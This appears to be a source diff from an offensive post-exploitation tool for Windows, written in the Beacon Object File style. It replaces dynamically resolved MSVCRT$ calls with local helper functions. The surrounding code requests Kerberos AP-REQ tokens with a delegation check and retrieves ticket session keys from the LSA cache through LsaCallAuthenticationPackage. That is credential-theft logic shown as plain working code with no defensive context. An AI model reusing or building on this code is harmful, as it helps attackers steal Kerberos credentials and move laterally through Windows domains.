@@ -18,7 +18,7 @@ LONG RequestApReq(char* spn, PUCHAR* apreq, PULONG apreqSize, BOOL checkDelegate
             if (condition) {
                 PUCHAR out = (PUCHAR)MSVCRT$calloc(secBuf.cbBuffer, sizeof(UCHAR));
                 if (out != NULL) {
-                    MSVCRT$memcpy(out, secBuf.pvBuffer, secBuf.cbBuffer);
+                    _memcpy(out, secBuf.pvBuffer, secBuf.cbBuffer);
                     *apreq = out;
                     *apreqSize = secBuf.cbBuffer;
                     if (secBuf.pvBuffer) {
@@ -49,7 +49,7 @@ NTSTATUS GetKeyFromCache(char* target, LONG encType, PUCHAR* key, PULONG keySize
         if (NT_SUCCESS(status)) {
             WCHAR* wTarget = GetWideString(target);
             if (wTarget != NULL) {
-                USHORT dwTarget = (MSVCRT$wcslen(wTarget) + 1) * sizeof(WCHAR);
+                USHORT dwTarget = (_wcslen(wTarget) + 1) * sizeof(WCHAR);
                 ULONG requestSize = dwTarget + sizeof(KERB_RETRIEVE_TKT_REQUEST);
                 PKERB_RETRIEVE_TKT_REQUEST request =
                     (PKERB_RETRIEVE_TKT_REQUEST)MSVCRT$calloc(requestSize, sizeof(KERB_RETRIEVE_TKT_REQUEST));
@@ -60,7 +60,7 @@ NTSTATUS GetKeyFromCache(char* target, LONG encType, PUCHAR* key, PULONG keySize
                     request->TargetName.Length = dwTarget - sizeof(WCHAR);
                     request->TargetName.MaximumLength = dwTarget;
                     request->TargetName.Buffer = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
-                    MSVCRT$memcpy(request->TargetName.Buffer, wTarget, request->TargetName.MaximumLength);
+                    _memcpy(request->TargetName.Buffer, wTarget, request->TargetName.MaximumLength);
                     PKERB_RETRIEVE_TKT_RESPONSE response;
                     NTSTATUS protocolStatus;
                     status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, &response,
@@ -71,7 +71,7 @@ NTSTATUS GetKeyFromCache(char* target, LONG encType, PUCHAR* key, PULONG keySize
                             if (requestSize > 0) {
                                 char* out = (char*)MSVCRT$calloc(response->Ticket.SessionKey.Length, sizeof(char));
                                 if (out != NULL) {
-                                    MSVCRT$memcpy(out, response->Ticket.SessionKey.Value,
+                                    _memcpy(out, response->Ticket.SessionKey.Value,
                                                   response->Ticket.SessionKey.Length);
                                     *key = out;
                                     *keySize = response->Ticket.SessionKey.Length;
@@ -139,7 +139,7 @@ PVOID MemorySearch(LPCVOID pattern, SIZE_T pSize, LPCVOID buf, SIZE_T bSize) {
     PBYTE limit = current;
 
     for (current = (PBYTE)buf; !status && (current + pSize <= limit); current++) {
-        status = !MSVCRT$memcmp(pattern, current, pSize);
+        status = !_memcmp(pattern, current, pSize);
     }
     if (status) {
         result = current - 1;
